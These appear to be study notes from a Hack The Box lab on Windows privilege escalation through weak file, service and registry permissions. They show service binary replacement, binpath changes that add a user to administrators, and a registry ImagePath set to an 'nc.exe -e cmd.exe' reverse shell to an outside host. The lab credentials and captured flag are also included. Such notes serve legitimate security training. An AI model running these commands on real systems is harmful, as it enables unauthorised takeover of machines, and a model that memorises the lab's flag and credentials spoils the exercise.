# Weak Permissions

## Permissive File System ACLs

### Running SharpUp

https://github.com/GhostPack/SharpUp/

```
.\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
  
```

### Checking Permissions with icacls

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### Replacing Service Binary

Replace the original binary with a malicious binary generated with msfvenom

```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

## Weak Service Permissions

### Reviewing SharpUp Again

```
SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Checking Permissions with AccessChk

https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

```
accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

1) Check Local Admin Group

```
net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

2) Changing the Service Binary Path

```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

3) Stopping Service

```
sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

4) Starting service

```
sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

5) Confirming Local Admin Group Addition

```
net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

Other example : https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322

#### Weak Service Permissions - Cleanup

1) Reverting the Binary Path

```
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
```

2) Starting the Service Again

```
sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
```

3) Verifying Service is Running

```
sc query WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

## Unquoted Service Path

Example of Service Binary Path :
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

1) Querying Service

```
sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

2) Searching for Unquoted Service Paths

```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

3) Creating an hijacking library

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, NT AUTHORITY\SYSTEM.

C:\Program.exe\
C:\Program Files (x86)\System.exe

--> Often, it is not exploitable

## Permissive Registry ACLs

1) Checking for Weak Service ACLs in Registry

```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP> 
```

2) Changing ImagePath with PowerShell

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary

1) Check Startup Programs

```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

## LAB

xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!

c:\Tools>.\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"


=== AlwaysInstallElevated Registry Keys ===



=== Modifiable Folders in %PATH% ===



=== Modifiable Registry Autoruns ===



=== *Special* User Privileges ===



=== Unattended Install Files ===



=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 3 seconds


c:\Tools>accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS

c:\Tools>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.

c:\Tools>sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
[SC] ChangeServiceConfig SUCCESS

c:\Tools>sc stop WindscribeService

SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0


c:\Tools>sc start WindscribeService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

c:\Tools>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.

Run cmd as administrator (enter htb-student password)

C:\WINDOWS\system32>type c:\Users\Administrator\Desktop\WeakPerms\flag.txt
Aud1t_th0se_s3rv1ce_p3rms!